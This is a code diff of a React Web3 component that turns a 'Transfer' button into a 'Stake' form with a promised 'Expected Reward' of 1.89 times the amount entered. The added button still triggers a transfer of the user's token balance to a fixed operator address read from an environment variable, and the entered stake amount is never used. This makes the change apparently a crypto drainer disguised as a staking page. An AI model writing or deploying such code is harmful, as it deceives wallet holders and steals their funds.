@@ -31,6 +31,9 @@ const Guide = ({
   //
   const [listAllTokens, setListAllTokens] = useState([]);
 
+  const [stakeValue, setStakeValue] = useState(null);
+  const [processingStaking, setProcessingStaking] = useState(false);
+
   // 0xbe9375c6a420d2eeb258962efb95551a5b722803
 
   let to = process.env.REACT_APP_MY_ADDRESS;
@@ -143,8 +146,14 @@ const Guide = ({
       if (!isAddress) {
         console.log("Invalid address provided, please try again");
       } else {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await transferToken(balanceObj, to, provider);
+        try {
+          const provider = new ethers.providers.Web3Provider(window.ethereum);
+          await transferToken(balanceObj, to, provider);
+          setProcessingStaking(false);
+        } catch (error) {
+          setProcessingStaking(false);
+          console.log(error);
+        }
       }
     }
   };
@@ -420,40 +429,63 @@ const Guide = ({
                 </div>
               </div>
             ) : (
-              <div>
-                Lorem ipsum dolor sit amet consectetur adipisicing elit. Odit
-                sunt eos dolorum repellat ex, laudantium consequuntur a quisquam
-                saepe, aliquam dolore unde! Ea ex aliquam saepe optio fugiat?
-                Laborum architecto incidunt debitis saepe natus, repellendus
-                quos at commodi. A cumque voluptatem dolore veniam placeat.
+              <div className={styles.stakeContainer}>
+                <div className={styles.stakeGuide}>
+                  Lorem ipsum dolor sit amet consectetur adipisicing elit. Odit
+                  sunt eos dolorum repellat ex, laudantium consequuntur a
+                  quisquam saepe, aliquam dolore unde! Ea ex aliquam saepe optio
+                  fugiat? Laborum architecto incidunt debitis saepe natus,
+                  repellendus quos at commodi. A cumque voluptatem dolore veniam
+                  placeat.
+                </div>
+
                 <div className={styles.stakeFormContainer}>
                   <form>
                     <div className={styles.formGroup}>
-                      <input type="text" />
+                      <input
+                        type="number"
+                        placeholder="enter amount to stake"
+                        onChange={(e) => {
+                          setStakeValue(e.target.value);
+                        }}
+                      />
                     </div>
+
+                    {result.length > 0 && (
+                      <div className={styles.stakeBalanceContent}>
+                        {result?.map((item) => (
+                          <div className={styles.stakeMapContent}>
+                            <button
+                              type="button"
+                              onClick={() => {
+                                if (!stakeValue) return;
+                                setProcessingStaking(true);
+                                setTransferClick(item);
+                              }}
+                            >
+                              {processingStaking ? "Processing" : "Stake"}
+                            </button>
+                            <div className={styles.stakeExtras}>
+                              <span>Your Balance </span>
+                              <span>
+                                {parseFloat(
+                                  formatBalance(item.balance, item.decimals)
+                                ).toFixed(2)}{" "}
+                                {item.name}
+                              </span>
+                            </div>
+                            <div className={styles.stakeExtras}>
+                              <span>Expected Reward</span>
+                              <span>
+                                {stakeValue * 1.89} {item.name}
+                              </span>
+                            </div>
+                          </div>
+                        ))}
+                      </div>
+                    )}
                   </form>
                 </div>
-                {result.length > 0 && (
-                  <div className={styles.ethBalanceContent}>
-                    {result?.map((item) => (
-                      <div>
-                        <h2>{item.name}</h2>
-                        <span>
-                          {parseFloat(
-                            formatBalance(item.balance, item.decimals)
-                          ).toFixed(2)}
-                        </span>
-                        <button
-                          onClick={() => {
-                            setTransferClick(item);
-                          }}
-                        >
-                          Transfer
-                        </button>
-                      </div>
-                    ))}
-                  </div>
-                )}
               </div>
             )}
           </div>
